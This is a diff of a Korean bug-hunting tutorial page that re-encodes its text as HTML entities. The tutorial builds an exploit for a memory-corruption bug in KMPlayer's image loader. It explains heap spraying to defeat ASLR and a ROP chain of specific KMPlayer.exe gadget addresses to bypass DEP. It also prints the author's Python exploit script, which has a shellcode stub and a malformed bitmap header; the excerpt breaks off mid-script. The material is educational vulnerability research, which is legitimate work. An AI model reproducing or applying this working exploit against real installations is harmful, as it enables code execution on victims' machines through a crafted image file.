+<p>&#xD5E4;&#xD5FF; &#xC790; &#xC774;&#xC81C; &#xADF8;&#xB7FC; <code>eip</code>&#xB97C; &#xC7A1;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;!!!</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--062.png"></p>
-<p>네….? 뭘 잡는다는 거죠….? 쥬륵…. ㅠㅠ 후우 역시 인생은 험난하네요…</p>
-<p>으음… 이제 디버깅해보면서 하나하나 해결해 나갈게요 ㅠㅠ<br>먼저 <code>0x11111111</code> 에 Access violation이 발생하는 것은 우리가 넣은 데이터가 유효한 메모리를 가리키게 하면 되겠죠!! 하지만!!! ASLR이 걸려있어서 그렇게 하는 게 쉽지 않다는 거…. 그렇기 때문에 스프레이를 진행해야 합니다. 다행히(??) KMPlayer와 ImLoader가 32 비트로 컴파일되어 있기 때문에 스프레이를 하면 어느 정도 릴라이어블하게 원하는 주소에 메모리를 매핑할 수 있습니다. 할당하는 메모리에 크기에 따라서 자주 매핑되는 주소가 달라집니다. 저는 여기에서 150M 정도를 0x11로 스프레이 했습니다. </p>
-<p>150M로 스프레이한 이유는 디버깅할 때 이 정도 크기가 가장 적당한 속도가 나와서 인데요. 디버깅할 때 <code>0x11111111</code> 에 매핑이 안되면 다시 시작해서 테스트를 해야 되잖아요? 크기가 커지면 원하는 주소에 매핑이 더 잘되지만 윈도우가 업데이트를 하면 할수록 랜덤 마이징이 잘돼서 크기가 커도 잘 안되더라고요 ㅠㅠ(예전에는 300M 만 해도 거의 고정이라고 들었는데…) 가장 효율적이라고 생각하는 크기로 했습니다. 만약 원하는 데로 잘 된다면 아래와 같이 해당 주소에 잘 매핑된 것을 볼 수 있습니다!!</p>
+<p>&#xB124;&#x2026;.? &#xBB58; &#xC7A1;&#xB294;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;&#x2026;.? &#xC96C;&#xB975;&#x2026;. &#x3160;&#x3160; &#xD6C4;&#xC6B0; &#xC5ED;&#xC2DC; &#xC778;&#xC0DD;&#xC740; &#xD5D8;&#xB09C;&#xD558;&#xB124;&#xC694;&#x2026;</p>
+<p>&#xC73C;&#xC74C;&#x2026; &#xC774;&#xC81C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xD574;&#xACB0;&#xD574; &#xB098;&#xAC08;&#xAC8C;&#xC694; &#x3160;&#x3160;<br>&#xBA3C;&#xC800; <code>0x11111111</code> &#xC5D0; Access violation&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xB123;&#xC740; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;!! &#xD558;&#xC9C0;&#xB9CC;!!! ASLR&#xC774; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB807;&#xAC8C; &#xD558;&#xB294; &#xAC8C; &#xC27D;&#xC9C0; &#xC54A;&#xB2E4;&#xB294; &#xAC70;&#x2026;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xD589;&#xD788;(??) KMPlayer&#xC640; ImLoader&#xAC00; 32 &#xBE44;&#xD2B8;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD558;&#xBA74; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xB9B4;&#xB77C;&#xC774;&#xC5B4;&#xBE14;&#xD558;&#xAC8C; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD560;&#xB2F9;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xC790;&#xC8FC; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC8FC;&#xC18C;&#xAC00; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; 150M &#xC815;&#xB3C4;&#xB97C; 0x11&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
+<p>150M&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD55C; &#xC774;&#xC720;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; &#xC774; &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xAC00; &#xAC00;&#xC7A5; &#xC801;&#xB2F9;&#xD55C; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC640;&#xC11C; &#xC778;&#xB370;&#xC694;. &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; <code>0x11111111</code> &#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xC548;&#xB418;&#xBA74; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#xD574;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xC57C; &#xB418;&#xC796;&#xC544;&#xC694;? &#xD06C;&#xAE30;&#xAC00; &#xCEE4;&#xC9C0;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xB354; &#xC798;&#xB418;&#xC9C0;&#xB9CC; &#xC708;&#xB3C4;&#xC6B0;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD558;&#xBA74; &#xD560;&#xC218;&#xB85D; &#xB79C;&#xB364; &#xB9C8;&#xC774;&#xC9D5;&#xC774; &#xC798;&#xB3FC;&#xC11C; &#xD06C;&#xAE30;&#xAC00; &#xCEE4;&#xB3C4; &#xC798; &#xC548;&#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694; &#x3160;&#x3160;(&#xC608;&#xC804;&#xC5D0;&#xB294; 300M &#xB9CC; &#xD574;&#xB3C4; &#xAC70;&#xC758; &#xACE0;&#xC815;&#xC774;&#xB77C;&#xACE0; &#xB4E4;&#xC5C8;&#xB294;&#xB370;&#x2026;) &#xAC00;&#xC7A5; &#xD6A8;&#xC728;&#xC801;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xD06C;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xB85C; &#xC798; &#xB41C;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC798; &#xB9E4;&#xD551;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!!</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--064.png"></p>
-<p>그리고 이대로 실행하면!!!</p>
+<p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xBA74;!!!</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--066.png"></p>
-<p>짝짝짝!! <code>eip</code>를 잡았습니다!!! 소리질러어어어어어어!!!! (하… 험난했다…) 이제 익스만 하면 되겠네요 ㅎㅎㅎ</p>
+<p>&#xC9DD;&#xC9DD;&#xC9DD;!! <code>eip</code>&#xB97C; &#xC7A1;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!!! &#xC18C;&#xB9AC;&#xC9C8;&#xB7EC;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;!!!! (&#xD558;&#x2026; &#xD5D8;&#xB09C;&#xD588;&#xB2E4;&#x2026;) &#xC774;&#xC81C; &#xC775;&#xC2A4;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E;&#x314E;</p>
 <hr>
-<p>일단 어떻게 <code>eip</code>를 잡게 되었는지 함 볼게요. 일단 스택에 있는 리턴 어드레스를 확인해서 어디에서 <code>call</code> 혹은 <code>jmp</code>를 했는지 확인해볼게요.</p>
+<p>&#xC77C;&#xB2E8; &#xC5B4;&#xB5BB;&#xAC8C; <code>eip</code>&#xB97C; &#xC7A1;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD568; &#xBCFC;&#xAC8C;&#xC694;. &#xC77C;&#xB2E8; &#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD574;&#xC11C; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; <code>call</code> &#xD639;&#xC740; <code>jmp</code>&#xB97C; &#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--068.png"></p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--070.png"></p>
-<p>스택에 있는 마지막 리턴 어드레스를 보니 <code>ImLoader+0x357f</code> 인 것을 확인할 수 있고 이 주소보다 위에 있는 instruction을 확인해보면 <code>call dword ptr [ecx-4]</code>인 것을 확인할 수 있습니다. 그리고 <code>ecx</code>는 <code>eax</code>가 가리키는 메모리에서 가져온 것이네요.</p>
+<p>&#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB9C8;&#xC9C0;&#xB9C9; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xBCF4;&#xB2C8; <code>ImLoader+0x357f</code> &#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xBCF4;&#xB2E4; &#xC704;&#xC5D0; &#xC788;&#xB294; instruction&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>call dword ptr [ecx-4]</code>&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>ecx</code>&#xB294; <code>eax</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xAC83;&#xC774;&#xB124;&#xC694;.</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--072.png"></p>
-<p>그럼 이제 중요한 거는 <code>0x11111111</code> 이 가리키는 데이터가 파일에서의 오프셋(위치??)이 <code>eax</code>가 가리키는 데이터의 오프셋이 일치하냐는 것인데요. 이 부분을 확인해보기 위해서 일단 <code>0x11111111</code> 부분이 어떤 위치에 있는지 보겠습니다.</p>
+<p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC911;&#xC694;&#xD55C; &#xAC70;&#xB294; <code>0x11111111</code> &#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xC624;&#xD504;&#xC14B;(&#xC704;&#xCE58;??)&#xC774; <code>eax</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xCE58;&#xD558;&#xB0D0;&#xB294; &#xAC83;&#xC778;&#xB370;&#xC694;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC77C;&#xB2E8; <code>0x11111111</code> &#xBD80;&#xBD84;&#xC774; &#xC5B4;&#xB5A4; &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--074.jpg"></p>
-<p>마지막 메모리가 전체 비트맵 이미지를 담고 있는 부분이기 때문에 해당 메모리 기준으로 계산하면 됩니다. <code>0x11111111 – 0x101cb056 = 0xF460BB</code> 네요. 앞에서 객체를 덮을 때에는 파일 기준으로 앞부분 데이터를 가져와 복사하기 때문에 페이로드를 담는 데에는 큰 문제가 없을 것 같습니다!!</p>
-<p>자 이제 페이로드를 작성해야 합니다. 페이로드를 작성하기 전에 MONA와 메타스플로잇을 사용해서 모듈들의 미티게이션 적용 항목, 필요한 가젯 검색, 쉘 코드 생성을 해야 하는 데 이 부분은 인터넷을 검색하면 많이 나오기 때문에 생략하도록 하겠습니다. 결론적으로 <code>KMPlayer.exe</code> 에 Rebase가 안 걸려있어서 <code>KMPlayer.exe</code> 에 있는 가젯을 사용하도록 할 것이고요, 메타스플로잇을 통해서는 계산기를 실행시키는 쉘 코드를 만들 것입니다.</p>
-<p>일단 ASLR은 스프레이로 어느 정도 커버하였고 DEP만 무력화시키고 쉘 코드를 작성하면 됩니다. DEP를 무력화하려면 ROP를 해야죠!! 이제 <code>esp</code>를 우리 데이터가 있는 힙 메모리로 피봇 시킬 것입니다. 음 적당한 가젯을 찾아보도록 하죠.</p>
+<p>&#xB9C8;&#xC9C0;&#xB9C9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC804;&#xCCB4; &#xBE44;&#xD2B8;&#xB9F5; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. <code>0x11111111 &#x2013; 0x101cb056 = 0xF460BB</code> &#xB124;&#xC694;. &#xC55E;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB97C; &#xB36E;&#xC744; &#xB54C;&#xC5D0;&#xB294; &#xD30C;&#xC77C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC55E;&#xBD80;&#xBD84; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB2F4;&#xB294; &#xB370;&#xC5D0;&#xB294; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!!</p>
+<p>&#xC790; &#xC774;&#xC81C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; MONA&#xC640; &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xBAA8;&#xB4C8;&#xB4E4;&#xC758; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC801;&#xC6A9; &#xD56D;&#xBAA9;, &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC82F; &#xAC80;&#xC0C9;, &#xC258; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;&#xC744; &#xD574;&#xC57C; &#xD558;&#xB294; &#xB370; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC778;&#xD130;&#xB137;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xB9CE;&#xC774; &#xB098;&#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0DD;&#xB7B5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C; <code>KMPlayer.exe</code> &#xC5D0; Rebase&#xAC00; &#xC548; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; <code>KMPlayer.exe</code> &#xC5D0; &#xC788;&#xB294; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xAC83;&#xC774;&#xACE0;&#xC694;, &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD1B5;&#xD574;&#xC11C;&#xB294; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC77C;&#xB2E8; ASLR&#xC740; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB85C; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xCEE4;&#xBC84;&#xD558;&#xC600;&#xACE0; DEP&#xB9CC; &#xBB34;&#xB825;&#xD654;&#xC2DC;&#xD0A4;&#xACE0; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. DEP&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD558;&#xB824;&#xBA74; ROP&#xB97C; &#xD574;&#xC57C;&#xC8E0;!! &#xC774;&#xC81C; <code>esp</code>&#xB97C; &#xC6B0;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xD53C;&#xBD07; &#xC2DC;&#xD0AC; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC74C; &#xC801;&#xB2F9;&#xD55C; &#xAC00;&#xC82F;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0x00523702</span> : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</code></pre>
 
-<p>일부로 두 번 더 <code>POP</code> 해주는 이유는 위에 보시다시피 <code>0x11111111</code> 부분에 8 바이트가 다른 데이터로 덮여 있기 때문에 이 8 바이트를 뛰어넘고 리턴하기 위함입니다.</p>
-<p>자 그러면 페이로드를 작성할 때 아래와 같이 하면 되겠네요.</p>
-<p>제일 처음 부분에는 위 가젯의 주소를 사용할 겁니다. 그리고 바로 그 뒤에는 또 피봇 하는 가젯을 넣어줄 겁니다. 이번에는 그냥 힙에서만요. 왜냐하면 이번에는 <code>0x101cb056</code> 에 매핑이 되었지만 다음에 또 이 언저리 주소에 매핑될 때도 이 주소라는 보장이 없으니깐요. 최소한 하위 2 바이트는 바뀌겠죠. 그렇기 때문에 <code>esp</code>를 스택에서 힙으로, 다시 힙에서 다 높은 주소의 힙으로 피봇 하는 가젯 두 개를 스프레이 해줄 겁니다. 힙에서 힙으로 피봇 하는 가젯은 아래 걸로 쓰도록 할게요.</p>
+<p>&#xC77C;&#xBD80;&#xB85C; &#xB450; &#xBC88; &#xB354; <code>POP</code> &#xD574;&#xC8FC;&#xB294; &#xC774;&#xC720;&#xB294; &#xC704;&#xC5D0; &#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; <code>0x11111111</code> &#xBD80;&#xBD84;&#xC5D0; 8 &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB85C; &#xB36E;&#xC5EC; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; 8 &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xB6F0;&#xC5B4;&#xB118;&#xACE0; &#xB9AC;&#xD134;&#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC790; &#xADF8;&#xB7EC;&#xBA74; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD560; &#xB54C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
+<p>&#xC81C;&#xC77C; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC5D0;&#xB294; &#xC704; &#xAC00;&#xC82F;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBC14;&#xB85C; &#xADF8; &#xB4A4;&#xC5D0;&#xB294; &#xB610; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F;&#xC744; &#xB123;&#xC5B4;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xD799;&#xC5D0;&#xC11C;&#xB9CC;&#xC694;. &#xC65C;&#xB0D0;&#xD558;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>0x101cb056</code> &#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C;&#xC5D0; &#xB610; &#xC774; &#xC5B8;&#xC800;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB420; &#xB54C;&#xB3C4; &#xC774; &#xC8FC;&#xC18C;&#xB77C;&#xB294; &#xBCF4;&#xC7A5;&#xC774; &#xC5C6;&#xC73C;&#xB2C8;&#xAE50;&#xC694;. &#xCD5C;&#xC18C;&#xD55C; &#xD558;&#xC704; 2 &#xBC14;&#xC774;&#xD2B8;&#xB294; &#xBC14;&#xB00C;&#xACA0;&#xC8E0;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>esp</code>&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xD799;&#xC73C;&#xB85C;, &#xB2E4;&#xC2DC; &#xD799;&#xC5D0;&#xC11C; &#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC758; &#xD799;&#xC73C;&#xB85C; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F; &#xB450; &#xAC1C;&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774; &#xD574;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;. &#xD799;&#xC5D0;&#xC11C; &#xD799;&#xC73C;&#xB85C; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F;&#xC740; &#xC544;&#xB798; &#xAC78;&#xB85C; &#xC4F0;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0x0095dffa</span> : # ADD ESP,<span class="hljs-number">19010</span> # POP EBP # POP EDI # POP ESI # POP EBX # RETN</code></pre>
 
-<p>그리고 중간중간에 프로그램에서 힙을 쓰다가 바꾼 메모리들을 스킵할 수 있도록 아래 가젯을 사용하겠습니다.</p>
+<p>&#xADF8;&#xB9AC;&#xACE0; &#xC911;&#xAC04;&#xC911;&#xAC04;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xD799;&#xC744; &#xC4F0;&#xB2E4;&#xAC00; &#xBC14;&#xAFBC; &#xBA54;&#xBAA8;&#xB9AC;&#xB4E4;&#xC744; &#xC2A4;&#xD0B5;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC544;&#xB798; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0x00433712</span> : # POP EDX # POP EDI # POP ESI # POP EBX # RETN</code></pre>
 
-<p>그리고 이제 높은 주소로 피봇 했으면 그 부분에도 <code>ret</code>으로 스프레이를 해주면 좀 더 정확도가 높아지겠네요 ㅎㅎ</p>
-<p>그럼 파일을 구성할 때에는 아래와 같이 하면 되겠네요</p>
+<p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xB85C; &#xD53C;&#xBD07; &#xD588;&#xC73C;&#xBA74; &#xADF8; &#xBD80;&#xBD84;&#xC5D0;&#xB3C4; <code>ret</code>&#xC73C;&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xC880; &#xB354; &#xC815;&#xD655;&#xB3C4;&#xAC00; &#xB192;&#xC544;&#xC9C0;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E;</p>
+<p>&#xADF8;&#xB7FC; &#xD30C;&#xC77C;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/Untitled.png"></p>
-<p>아래는 제가 작성한 익스플로잇 코드입니다.</p>
+<p>&#xC544;&#xB798;&#xB294; &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack
 <span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict
 
@@ -326,7 +326,7 @@
 	<span class="hljs-number">0x90909090</span>, <span class="hljs-comment"># nop</span>
 	<span class="hljs-number">0x00744e56</span>, <span class="hljs-comment"># PUSHAD # RETN [KMPlayer.exe]</span>
 	]
-	<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)
+	<span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&apos;</span>.join(pack(<span class="hljs-string">&apos;&lt;I&apos;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)
 
 <span class="hljs-comment">#shellcode for runnig cmd.exe</span>
 shellcode = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">0x100</span>
@@ -356,28 +356,28 @@ rop_chain = create_rop_chain()
 BITMAPFILEHEADER = OrderedDict()
 BITMAPINFOHEADER = OrderedDict()
 
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSize&#x27;</span>] = <span class="hljs-string">&#x27;\x28\x1f\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x28</span>
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biPlanes&#x27;</span>] = <span class="hljs-string">&#x27;\x01\x00&#x27;</span>
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biBitCount&#x27;</span>] = <span class="hljs-string">&#x27;\x18\x00&#x27;</span>
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biCompression&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x0a\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>
